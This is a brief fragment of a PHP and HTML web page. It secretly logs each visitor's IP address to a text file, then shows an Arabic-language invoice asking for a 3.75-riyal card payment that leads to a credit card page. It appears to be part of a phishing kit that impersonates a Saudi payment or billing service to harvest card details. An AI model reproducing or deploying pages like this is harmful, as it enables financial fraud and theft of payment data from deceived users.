...
$vi = $date . "===> " . getIPAddress() . "\n";
$house2 = fopen('visits.txt', 'a');
    fwrite($house2, $vi);
    fclose($house2);
?>
...
<form action="creditcard.php" method="post" novalidate="novalidate">                   
                <center> <span class="generic_page_title">الفاتورة</span></center>
                 <span class="login_subtitle"> طريقة الدفع</span>

                    <div class="form_check">
                        <input class="form_check_input flexRadioDefault" value="3" type="radio" checked disabled name="flexRadioDefault" id="flexRadioDefault3">
                        <label class="form_check_label" for="flexRadioDefault3">
                        بطاقة الائتمان
                        </label>
                    </div>
                    <span style="font-size: 15px;" class="login_subtitle">المبلغ : 3,75 ريال سعودي</span>

                    <center> <div style="display: block;" class="section_btns">
                        
                        <button class="btn primary_btn" onclick="location.replace('creditcard.php');" type="submit">دفع الفاتورة</button>
                    </div>
                    </center>
